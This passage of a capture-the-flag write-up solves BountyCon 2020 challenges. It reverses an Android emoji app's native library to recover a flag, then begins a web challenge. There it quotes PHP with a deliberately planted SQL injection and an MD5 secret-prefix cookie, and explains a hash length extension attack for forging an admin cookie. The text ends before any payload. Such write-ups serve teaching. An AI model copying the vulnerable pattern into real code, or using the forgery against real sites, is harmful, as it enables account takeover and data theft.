<p>You can also run the code in Node.js by replacing the first line of the patched code with the original unbeautified code.</p>



<p>I didn't know what <a href="https://en.wikipedia.org/wiki/Befunge">Befunge</a> was before reading the flag, it's an esoteric programming language which was somewhat implemented in this challenge in JavaScript.</p>



<p>When you enter the flag in the password field and click Check, it'll just turn green:
<img src="/--/bountycon20/mazerunner/mr-success.png" alt="Maze Runner Success" width="516" /></p>



<h3 id="meggenser--reversing--published-dec-24">Meggenser â Reversing â published Dec 24</h3>

<blockquote>
  <p>Welcome to the public beta of our new messaging app, with heavily optimised Emoji Input menuâ¢.</p>



  <p>Note: the flag format for this challenge is bountycon-â¦</p>



  <p><a href="/--/bountycon20/attachments/meggenser.tar.gz">meggenser.tar.gz</a></p>


</blockquote>

<p><img src="/--/bountycon20/meggenser/meggenser.png" alt="Meggenser" width="360" /></p>



<p>Meggenser is like a one-sided Messenger app where you can enter "emoji codes" (like <code class="highlighter-rouge">:grinning-face:</code>) which will get transformed into the corresponding emoji.</p>



<p>The description says the flag format for this challenge deviates from the usual <code class="highlighter-rouge">BountyCon{...}</code>. Notice a similarity with the emoji code and this new flag format? This suggests the right emoji code is the flag itself.</p>



<p>Proceed by dynamically debugging the app. The app can be run on a real device or an emulator. Emulators generally make things easier. I tried <a href="https://www.bluestacks.com/">BlueStacks</a> and <a href="https://www.bignox.com/">Nox</a> but later ran into issues with rooting. Eventually I ended up installing <a href="https://developer.android.com/studio">Android Studio</a>. Android Studio (AVD Manager) has first class support for emulators from Google. Make sure to install a "Google APIs" version and not a "Google Play" version or you'll face <a href="https://stackoverflow.com/questions/43923996/adb-root-is-not-working-on-emulator-cannot-run-as-root-in-production-builds">issues with running things as root</a>:</p>



<p><img src="/--/bountycon20/meggenser/emulator.png" alt="Meggenser Emulator" /></p>



<p>Install the app on the emulator using <a href="https://developer.android.com/studio/command-line/adb">adb</a> by running <code class="highlighter-rouge">adb install meggenser.apk</code></p>



<p>Decompile the apk with <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> by running <code class="highlighter-rouge">apktool d meggenser.apk</code></p>



<p>In the <code class="highlighter-rouge">meggenser/assets</code> directory, you'll find <code class="highlighter-rouge">index.html</code> which is what loads up when you run the app, and you'll find it includes <code class="highlighter-rouge">client.js</code>. <code class="highlighter-rouge">client.js</code> includes a list of the emoji codes that appear in the emoji input menu:</p>


<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">emojiList</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"grinning-face"</span><span class="p">,</span><span class="s2">"grinning-face-with-big-eyes"</span><span class="p">,...]</span> <span class="c1">// 1728 total items</span>
</code></pre></div></div>
<p>It however will not include the <code class="highlighter-rouge">bountycon-...</code> emoji code or flag.</p>



<p>The <code class="highlighter-rouge">assets</code> directory has a <code class="highlighter-rouge">sheets</code> directory containing <a href="https://en.wikipedia.org/wiki/Sprite_(computer_graphics)">sprites</a> of the emojis. Each file in that directory is a <code class="highlighter-rouge">.png</code> containing 91 emojis. The last file <code class="highlighter-rouge">18.png</code> has a flag emoji which doesn't appear in the emoji input menu:</p>



<p><img src="/--/bountycon20/meggenser/sprite.png" alt="Meggenser Sprite" /></p>



<p>Since you found only 1728 emojis in <code class="highlighter-rouge">client.js</code>, and there are 1729 emojis total (<code class="highlighter-rouge">91*19</code>), it means the 1729th emoji code is the flag.</p>



<p>You'll find it has a native library called <code class="highlighter-rouge">libparse.so</code> in the <code class="highlighter-rouge">lib</code> directory. <code class="highlighter-rouge">smali/com/facebook/bountycon2020/app/Emojifier.smali</code> loads this library and provides an interface for three functions in it: <code class="highlighter-rouge">preinit</code>, <code class="highlighter-rouge">init</code> and <code class="highlighter-rouge">parse</code>.</p>



<p>The <code class="highlighter-rouge">e1.bin</code> file in the <code class="highlighter-rouge">assets</code> directory is read by the app (<code class="highlighter-rouge">meggenser/smali/com/facebook/bountycon2020/app/MainActivity.smali</code>) and sent to the <code class="highlighter-rouge">preinit</code> function. The <code class="highlighter-rouge">preinit</code> function XOR decrypts this file and the <code class="highlighter-rouge">init</code> function parses the decrypted file and stores it in memory in a different layout.</p>



<p>You need to reverse engineer <code class="highlighter-rouge">libparse.so</code>, it's the main part of this challenge. I only understood a small part of it and mostly debugged the app using <a href="https://frida.re/">frida</a>, <a href="https://github.com/iGio90/Dwarf">Dwarf</a> and <a href="https://www.gnu.org/software/gdb/">GDB</a> (with <a href="https://github.com/hugsy/gef">GEF</a>). With <a href="https://binary.ninja/">Binary Ninja</a> (a Ghidra alternative), I found the decryption key for <code class="highlighter-rouge">e1.bin</code> was <code class="highlighter-rouge">are you sure you want to know what is hidden in this?</code> (present in the <code class="highlighter-rouge">preinit</code> function).</p>



<p>Inspect the library in Ghidra (I opened <code class="highlighter-rouge">meggenser/lib/x86_64/libparse.so</code>) and you'll find many references to <code class="highlighter-rouge">DAT_00103008</code>, in the <code class="highlighter-rouge">init</code> function and in the <code class="highlighter-rouge">parse</code> function (which is called with the string that you type when you tap "Send"). This memory location looks like where most of the main data is stored (from <code class="highlighter-rouge">e1.bin</code>) and you can guess that that data mostly comprises of emoji codes.</p>



<p>In the <code class="highlighter-rouge">init</code> function, you'll see a <code class="highlighter-rouge">calloc</code> call allocates memory and assigns to it:</p>


<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[...]</span>
  <span class="n">DAT_00103008</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mh">0x130</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="p">);</span>
  <span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>From <code class="highlighter-rouge">man calloc</code>:</p>



<blockquote>
  <p>void * calloc(size_t count, size_t size);</p>



  <p>The calloc() function contiguously allocates enough space for <em>count</em> objects that are <em>size</em> bytes of memory each and returns a pointer to the
allocated memory.  The allocated memory is filled with bytes of value zero.</p>


</blockquote>

<p>The first argument is a constant 0x130 (304) bytes. The second argument is a variable. It's allocating n blocks of 304 bytes each. You need to find the size or the address of this memory region.</p>



<p>I set a breakpoint on the <code class="highlighter-rouge">calloc</code> line using <a href="https://github.com/iGio90/Dwarf">Dwarf</a> (to run Dwarf you need to setup <a href="https://frida.re/docs/android/">frida-server</a>), ran the app and found the address of the memory region. Then I ran <code class="highlighter-rouge">cat /proc/PID_OF_APP/maps</code> in <code class="highlighter-rouge">adb shell</code> (which gets you a shell inside the emulator) and found the size, which was <code class="highlighter-rouge">0x600000</code>:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>721ac1800000-721ac1e00000 rw-p 00000000 00:00 0       [anon:libc_malloc]
</code></pre></div></div>
<p>(the memory addresses are randomized and will be different for you, make sure to change them before running any command)</p>



<p>After finding the size of the memory region, use <a href="https://www.gnu.org/software/gdb/">GDB</a> (and <a href="https://github.com/hugsy/gef">GEF</a>) and <a href="https://packmad.github.io/gdb-android/">attach to the process of the app</a> by running the following commands:</p>



<ol>
  <li><code class="highlighter-rouge">adb root</code></li>
  <li><code class="highlighter-rouge">adb shell</code> to get a shell inside the emulator</li>
  <li>In emulator shell: <code class="highlighter-rouge">ps -A | grep bountycon</code> to find out the PID of the process</li>
  <li>In emulator shell: <code class="highlighter-rouge">gdbserver64 :1337 --attach $PID</code> to run gdbserver attached to the process on port 1337</li>
  <li><code class="highlighter-rouge">adb forward tcp:1337 tcp:1337</code> to forward port 1337 between the emulator and your computer</li>
  <li><code class="highlighter-rouge">gdb</code></li>
  <li>In gdb: <code class="highlighter-rouge">gef-remote :1337</code> to connect to gdbserver in the emulator</li>
</ol>

<p>GDB should now be debugging the process. You can run <code class="highlighter-rouge">info proc mapping</code> and find the address of the memory region that has a size of <code class="highlighter-rouge">0x600000</code> bytes:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x721ac1800000     0x721ac1e00000   0x600000        0x0 [anon:libc_malloc]
</code></pre></div></div>

<p>Run <code class="highlighter-rouge">dump binary memory memdump.bin 0x721ac1800000 0x721ac1e00000</code> to dump the memory region to <code class="highlighter-rouge">memdump.bin</code></p>



<p>You can now inspect the dumped memory and try to guess how the emoji codes are stored there. Reading the source decompilation in Ghidra should help too. I mostly guessed how everything was laid out.</p>



<p>You know each block is 304 bytes long from the <code class="highlighter-rouge">calloc</code> call. Observe the data every 304 bytes, and you'll find it always starts with a constant value, which is either <code class="highlighter-rouge">0xffffffff</code> or a number smaller than 1729. After this constant value, you'll notice it's just composed of pointers (pointers are 64-bit/8 byte long on 64-bit systems), there's no more than 37 pointers and all of the pointers either point to the start of a block or point to nothing (null).</p>



<p>37 seemed an interesting number, because 36 pointers would've meant <code class="highlighter-rouge">a-z</code> and <code class="highlighter-rouge">0-9</code>, and one more additional character in this context would probably refer to <code class="highlighter-rouge">-</code>. This led me to understand/guess the layout of the memory region and how to parse it.</p>



<p>In C, each block can be represented by:</p>


<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">block</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">constant</span><span class="p">;</span>
    <span class="n">block</span><span class="o">*</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">37</span><span class="p">];</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Here's a simpler description of what the 304 bytes are composed of:</p>



<table>
  <tbody>
    <tr>
      <td>8 bytes</td>
      <td>0xffffffff constant or emoji index</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "-"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "a"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "b"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "c"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "d"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "e"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "f"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "g"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "h"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "i"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "j"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "k"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "l"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "m"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "n"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "o"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "p"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "q"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "r"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "s"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "t"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "u"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "v"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "w"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "x"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "y"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "z"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "0"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "1"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "2"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "3"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "4"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "5"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "6"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "7"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "8"</td>
    </tr>
    <tr>
      <td>8 bytes</td>
      <td>pointer to block for character "9"</td>
    </tr>
  </tbody>
</table>

<p>You can figure out which pointer represents which character (<code class="highlighter-rouge">-abcdefghijklmnopqrstuvwxyz0123456789</code>) with some trial and error.</p>



<p>Start at the first block and follow the pointer for "b" (which is the 3rd pointer). It'll lead you to a block, follow the pointer for "o" (16th pointer) in this block and arrive at another block. Continue doing this with "u", "n", "t", "y", and eventually the current block will only contain 1 pointer and all other 36 pointers will be null. Finally all 37 pointers will be null and that is when you can stop your search.</p>



<p>This is hard to do manually so you should write a script. Here's what I wrote:</p>



<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'fs'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">memory</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">'memdump.bin'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">BASE_POINTER</span> <span class="o">=</span> <span class="mh">0x721ac1800000</span> <span class="c1">// change this to the start address of the memory region</span>

<span class="kd">const</span> <span class="nx">BLOCK_LENGTH</span> <span class="o">=</span> <span class="mi">304</span>
<span class="kd">const</span> <span class="nx">indexes</span> <span class="o">=</span> <span class="s1">'-abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">parseHex</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">=&gt;</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">readPointer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">block</span><span class="p">,</span> <span class="nx">offset</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">parseHex</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">offset</span><span class="p">,</span> <span class="nx">offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">))</span>
<span class="kd">const</span> <span class="nx">getBytes</span> <span class="o">=</span> <span class="p">(</span><span class="nx">pointer</span><span class="p">,</span> <span class="nx">count</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">pointer</span> <span class="o">-</span> <span class="nx">BASE_POINTER</span>
  <span class="k">return</span> <span class="nx">memory</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span> <span class="nx">s</span> <span class="o">+</span> <span class="nx">count</span><span class="p">)</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nx">getAvailableCharsInBlock</span><span class="p">(</span><span class="nx">block</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">chars</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">37</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">*</span> <span class="mi">8</span>
    <span class="kd">const</span> <span class="nx">pointer</span> <span class="o">=</span> <span class="nx">parseHex</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span> <span class="nx">s</span> <span class="o">+</span> <span class="mi">8</span><span class="p">).</span><span class="nx">reverse</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">pointer</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="nx">chars</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">indexes</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">chars</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">currentBlock</span> <span class="o">=</span> <span class="nx">getBytes</span><span class="p">(</span><span class="nx">BASE_POINTER</span><span class="p">,</span> <span class="nx">BLOCK_LENGTH</span><span class="p">)</span>
<span class="kd">let</span> <span class="nx">finalStr</span> <span class="o">=</span> <span class="s1">''</span>
<span class="kd">const</span> <span class="nx">str</span> <span class="o">=</span> <span class="s1">'bountycon'</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">''</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">c</span> <span class="o">=&gt;</span> <span class="nx">indexes</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">c</span><span class="p">))</span>
<span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">avail</span> <span class="o">=</span> <span class="nx">getAvailableCharsInBlock</span><span class="p">(</span><span class="nx">currentBlock</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>
  <span class="kd">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">avail</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">1</span> <span class="p">?</span> <span class="nx">indexes</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">avail</span><span class="p">)</span> <span class="p">:</span> <span class="nx">str</span><span class="p">.</span><span class="nx">shift</span><span class="p">()</span>
  <span class="nx">finalStr</span> <span class="o">+=</span> <span class="nx">indexes</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span>
  <span class="kd">const</span> <span class="nx">pointer</span> <span class="o">=</span> <span class="nx">readPointer</span><span class="p">(</span><span class="nx">currentBlock</span><span class="p">,</span> <span class="mi">8</span> <span class="o">+</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">))</span>
  <span class="kd">const</span> <span class="nx">block</span> <span class="o">=</span> <span class="nx">getBytes</span><span class="p">(</span><span class="nx">pointer</span><span class="p">,</span> <span class="nx">BLOCK_LENGTH</span><span class="p">)</span>
  <span class="nx">currentBlock</span> <span class="o">=</span> <span class="nx">block</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">finalStr</span><span class="p">)</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">avail</span><span class="p">)</span> <span class="k">break</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>bountycon-3m0ji-5t4te-m4ch1n3</p>


</blockquote>

<p>The flag refers to state machine, you can read more about it <a href="https://en.wikipedia.org/wiki/Finite-state_machine">here</a>.</p>



<h3 id="uibeauty--web--published-dec-28">ui.beauty â Web â published Dec 28</h3>

<blockquote>
  <p>Good UI is not a choice.</p>



  <p><a href="https://178.128.95.74/ui/">https://178.128.95.74/ui/</a></p>


</blockquote>

<p>TL;DR: <a href="https://en.wikipedia.org/wiki/Length_extension_attack">Length Extension Attack</a>, SQL Injection</p>



<p><img src="/--/bountycon20/uibeauty/uibeauty-abovefold.png" alt="ui.beauty" /></p>



<p>This challenge has a lot of pages, all not very "beautiful" looking, deliberately so to make the name ironic. You can register for an account and login with it which will show you links to more pages (the "Customer Zone").</p>



<p><img src="/--/bountycon20/uibeauty/ui-customerzone.png" alt="ui.beauty Customer Zone" /></p>



<p>Explore around and you'll find the <a href="/--/bountycon20/uibeauty/ui-beauty-p2p.zip">source code of this challenge ("ui-beauty-p2p.zip")</a> (click "Try it!" under "ui.beauty P2P distribution").</p>



<p>As the name strongly hints, "Secret FLAGship product" will contain the flag but since you're not an admin (yet), it won't show you the flag:</p>



<p><img src="/--/bountycon20/uibeauty/ui-flagship.png" alt="ui.beauty Customer Zone" /></p>



<p>Inspect the source code you downloaded. You'll find the logged in user is determined from the <code class="highlighter-rouge">login</code> cookie in <code class="highlighter-rouge">index.php</code>:</p>



<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$user</span> <span class="o">=</span> <span class="nx">verify_cookie</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"login"</span><span class="p">]);</span>
</code></pre></div></div>

<p>And in <code class="highlighter-rouge">cookie.php</code>, you can see how the <code class="highlighter-rouge">login</code> cookie is constructed. You may also notice the SQL injection:</p>



<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$secret_db</span><span class="p">))</span>
  <span class="k">die</span><span class="p">(</span><span class="s2">"Forbidden"</span><span class="p">);</span>

<span class="k">function</span> <span class="nf">verify_cookie</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$secret_cookie_key</span><span class="p">;</span>
  <span class="nv">$cd</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cd</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">32</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="nv">$data</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">32</span><span class="p">);</span>
  <span class="nv">$hash</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cd</span><span class="p">,</span> <span class="o">-</span><span class="mi">32</span><span class="p">);</span>
  <span class="nv">$rhash</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$secret_cookie_key</span> <span class="o">.</span> <span class="nv">$data</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$rhash</span> <span class="o">!==</span> <span class="nv">$hash</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="c1">// very deliberate SQLi here:</span>
  <span class="nv">$user</span> <span class="o">=</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">"select `email`, `role` from `users` where `email` = </span><span class="se">\"</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$data</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span> <span class="p">[],</span> <span class="p">[</span><span class="s2">"email"</span><span class="p">,</span> <span class="s2">"role"</span><span class="p">]);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">encode_cookie</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$secret_cookie_key</span><span class="p">;</span>
  <span class="k">return</span> <span class="nb">strrev</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s2">"email"</span><span class="p">]</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$secret_cookie_key</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s2">"email"</span><span class="p">])));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>The cookie is reversed, base64 decoded, then the last 32 characters go into the <code class="highlighter-rouge">$hash</code> variable and the remaining characters go into the <code class="highlighter-rouge">$data</code> variable . A hash is recalculated (<code class="highlighter-rouge">$rhash</code>) using a secret constant <code class="highlighter-rouge">$secret_cookie_key</code> to verify that <code class="highlighter-rouge">$data</code> hasn't been tampered with. Seems alright so far? If you had access to <code class="highlighter-rouge">$secret_cookie_key</code> or could brute force it, you'd be able to tamper <code class="highlighter-rouge">$data</code> easily. In the <code class="highlighter-rouge">secrets.php</code> file though, you'll find a hint saying <code class="highlighter-rouge">$secret_cookie_key</code> is long and strong which means you can't brute force it:</p>


<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$secret_cookie_key</span> <span class="o">=</span> <span class="s2">"better make this long and strong"</span><span class="p">;</span>
</code></pre></div></div>

<p>MD5 along with SHA1, SHA2 &amp;c. is based on something called <a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction">MerkleâDamgÃ¥rd construction</a>. When some hash functions based on it are used to verify if data isn't tampered with by hashing a secret and the message (<code class="highlighter-rouge">hash(secret + message)</code>), they're vulnerable to <a href="https://en.wikipedia.org/wiki/Length_extension_attack">length extension attacks</a>. You can read more about it <a href="https://www.whitehatsec.com/blog/hash-length-extension-attacks/">here</a> and <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">here</a>. Essentially, you can append some data to the original message using this attack.</p>



<p>When you want to make sure data hasn't been tampered with, you should always use HMACs, which is designed to prevent attacks like this.</p>



<p>To execute a hash length extension attack, you need the length of the secret (which can be brute forced), the original message/data and the hash. You can then use a tool like <a href="https://github.com/iagox86/hash_extender">hash_extender</a>. I couldn't compile hash_extender on macOS easily, so I compiled it and used it on my Ubuntu server (you can also use any Linux VM).</p>



<p>You need a valid hash and data so go to the link of the challenge and copy the <code class="highlighter-rouge">login</code> cookie from your browser's developer tools. This is the cookie I got when I registered with <code class="highlighter-rouge">hi@kishan.info</code> as email:</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%3D%3DgNiRzYkRzYzcTNmJDM4YjY1YmNzQ2MhRmYwgDZmhjMm9mZulmLuFGazl2aAlGa
</code></pre></div></div>

<p>After <a href="https://gchq.github.io/CyberChef/#recipe=URL_Decode()Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true)&amp;input=JTNEJTNEZ05pUnpZa1J6WXpjVE5tSkRNNFlqWTFZbU56UTJNaFJtWXdnRFptaGpNbTltWnVsbUx1RkdhemwyYUFsR2E">URL decoding, reversing and base64 decoding</a>, you'll get:</p>



<blockquote>
  <p>hi@kishan.infof28fd80bda3d36f5b6802f573c4dc4b6</p>


</blockquote>

<p>The last 32 chars are the hash (<code class="highlighter-rouge">f28fd80bda3d36f5b6802f573c4dc4b6</code>) and the remaining is the data/email (<code class="highlighter-rouge">hi@kishan.info</code>).</p>



<p>Since you don't know the secret length (the secret length in the source code you have is 32 but it's not the same on the server), you can execute the attack for a big range like 8 to 256 characters and you'll know when any specific secret length works. You now know how to append anything to <code class="highlighter-rouge">$data</code> but what should you append?</p>



<p>Refer to the line that is vulnerable to the SQL injection:</p>


<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$user</span> <span class="o">=</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">"select `email`, `role` from `users` where `email` = </span><span class="se">\"</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$data</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span> <span class="p">[],</span> <span class="p">[</span><span class="s2">"email"</span><span class="p">,</span> <span class="s2">"role"</span><span class="p">]);</span>
</code></pre></div></div>

<p>It fetches <code class="highlighter-rouge">email</code> and <code class="highlighter-rouge">role</code> from the database. You can guess that <code class="highlighter-rouge">role</code> has to be <code class="highlighter-rouge">admin</code> for the flag to appear or just look in <code class="highlighter-rouge">tools-flagship.php</code>:</p>



<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s2">"role"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
  <span class="cp">?&gt;</span><span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"lead"</span><span class="nt">&gt;</span>Keep it to yourself.<span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"display-4"</span><span class="nt">&gt;</span><span class="cp">&lt;?=</span><span class="nv">$secret_flag</span><span class="p">;</span><span class="cp">?&gt;</span><span class="nt">&lt;/div&gt;</span><span class="cp">&lt;?php</span>
